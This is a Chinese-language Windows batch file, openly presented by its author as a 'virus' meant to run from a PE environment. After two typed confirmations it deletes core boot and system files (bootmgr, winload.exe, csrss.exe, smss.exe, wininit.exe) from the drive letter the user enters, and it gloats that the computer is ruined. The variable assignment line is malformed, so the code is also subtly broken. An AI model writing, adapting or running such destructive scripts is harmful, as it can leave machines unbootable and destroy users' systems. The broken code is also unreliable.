@echo off
title 小病毒by 哔哩哔哩UP主Windows-Taskmgr（UID:1702542056）
echo 此病毒灵感来源以及部分代码借鉴于SYSTEM-RAMOS-ZDY制作的暴力破解冰点还原的bat
echo 第一次写病毒，没经验，做的不好，望谅解！
if /i "%SystemDrive%"=="X:" (goto warning) else (
echo 此病毒必须在PE里运行！
pause>nul
exit
)
:warning
set /p warningone=此程序是个病毒，会删掉很多系统文件导致系统无法启动，你确定要继续运行此病毒导致系统无法启动吗？（继续运行请输入y回车，否则请输入其他任意字符）：
if /i not "%warningone%"=="y" (goto norun)
set /p warningtwo=最后的警告！！！此程序是病毒，会删掉很多系统文件导致系统无法启动，你确定要运行此病毒导致电脑无法启动吗？（继续运行请输入你的系统盘符回车，否则请直接敲击回车键）
if /i "%warningtwo%"=="" (goto norun)
echo 你的电脑即将被Windows-Taskmgr摧毁！面对疾风吧！！！
%pan%=%warningtwo%
del /s /q %pan%:\bootmgr
echo 你的系统引导被Windows-Taskmgr干掉啦！！！
del /s /q %pan%:\Windows\System32\winload.exe
echo 你的winload被Windows-Taskmgr干掉啦！！！
del /s /q %pan%:\Windows\System32\csrss.exe
echo 你的csrss被Windows-Taskmgr干掉啦！！！
del /s /q %pan%:\Windows\System32\smss.exe
echo 你的smss被Windows-Taskmgr干掉啦！！！
del /s /q %pan%:\Windows\System32\wininit.exe
echo 你的wininit被Windows-Taskmgr干掉啦！！！
echo 哈哈哈哈！！！你的电脑就这样废了！！！不信你重启试试！！！
pause>nul
exit
:norun
echo 好的，此程序将停止运行，你的系统未被更改！
pause>nul
exit
